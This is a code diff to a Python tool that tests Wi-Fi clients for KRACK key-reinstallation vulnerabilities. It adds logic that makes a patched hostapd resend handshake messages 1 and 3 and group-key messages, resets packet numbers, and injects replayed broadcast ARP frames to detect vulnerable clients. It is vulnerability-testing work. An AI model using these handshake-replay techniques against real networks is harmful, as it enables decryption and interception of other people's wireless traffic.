@@ -180,7 +180,7 @@ class ClientState():
 		self.groupkey_prev_canary_time = p.time
 
 	def groupkey_track_request(self):
-		"""Track when we went broadcast ARP requests, and determine if a client seems patched"""
+		"""Track when we send broadcast ARP requests, and determine if a client seems patched"""
 
 		if self.vuln_group != ClientState.UNKNOWN: return
 		hstype = "group key" if self.groupkey_grouphs else "4-way"
@@ -358,6 +358,7 @@ class KRAckAttackClient():
 
 	def run(self, test_grouphs=False, test_tptk=False):
 		self.configure_interfaces()
+		self.test_tptk = test_tptk
 
 		# Open the patched hostapd instance that carries out tests and let it start
 		log(STATUS, "Starting hostapd ...")
@@ -397,18 +398,6 @@ class KRAckAttackClient():
 		self.group_ip = self.dhcp.pool.pop()
 		self.group_arp = ARP_sock(sock=self.sock_eth, IP_addr=self.group_ip, ARP_addr=self.apmac)
 
-		# If applicable, inform hostapd that we are testing the group key handshake
-		if test_grouphs:
-			hostapd_command(self.hostapd_ctrl, "START_GROUP_TESTS")
-			self.test_grouphs = True
-
-		# If applicable, inform hostapd that we are testing for Temporal PTK (TPTK) construction behaviour
-		self.test_tptk = test_tptk
-		if self.test_tptk == KRAckAttackClient.TPTK_REPLAY:
-			hostapd_command(self.hostapd_ctrl, "TEST_TPTK")
-		elif self.test_tptk == KRAckAttackClient.TPTK_RAND:
-			hostapd_command(self.hostapd_ctrl, "TEST_TPTK_RAND")
-
 		log(STATUS, "Ready. Connect to this Access Point to start the tests. Make sure the client requests an IP using DHCP!", color="green")
 
 		# Monitor both the normal interface and virtual monitor interface of the AP
@@ -420,14 +409,33 @@ class KRAckAttackClient():
 
 			# Periodically send the replayed broadcast ARP requests to test for group key reinstallations
 			if time.time() > self.next_arp:
+				hostapd_command(self.hostapd_ctrl, "RESET_PN FF:FF:FF:FF:FF:FF")
+
 				self.next_arp = time.time() + HANDSHAKE_TRANSMIT_INTERVAL
 				for client in self.clients.values():
-					# Also keep injecting to PATCHED clients (just to be sure they keep rejecting replayed frames)
+					# 1. Test the 4-way handshake. We rely on an encrypted message 4 as reply to detect pairwise
+					#    key reinstallations reinstallations.
+					if not self.test_grouphs and client.vuln_4way != ClientState.VULNERABLE:
+						# First inject a message 1 if requested using the TPTK option
+						if self.test_tptk == KRAckAttackClient.TPTK_REPLAY:
+							hostapd_command(self.hostapd_ctrl, "RESEND_M1 " + client.mac)
+						elif self.test_tptk == KRAckAttackClient.TPTK_RAND:
+							hostapd_command(self.hostapd_ctrl, "RESEND_M1 " + client.mac + " change-anonce")
+
+						hostapd_command(self.hostapd_ctrl, "RESEND_M3 " + client.mac)
+
+					# 2. Test reinstallation of the group key (in both the 4-way and group key handshake). Keep
+					#    injecting to PATCHED clients (just to be sure they keep rejecting replayed frames)
 					if client.vuln_group != ClientState.VULNERABLE and client.mac in self.dhcp.leases:
+						if self.test_grouphs:
+							hostapd_command(self.hostapd_ctrl, "RESEND_GROUP_M1 " + client.mac)
+
 						clientip = self.dhcp.leases[client.mac]
 						client.groupkey_track_request()
-						log(INFO, "%s: sending broadcast ARP to %s from %s" % (client.mac, clientip, self.group_ip))
 
+						time.sleep(0.1)
+
+						log(INFO, "%s: sending broadcast ARP to %s from %s" % (client.mac, clientip, self.group_ip))
 						request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, hwsrc=self.apmac, psrc=self.group_ip, pdst=clientip)
 						self.sock_eth.send(request)
 
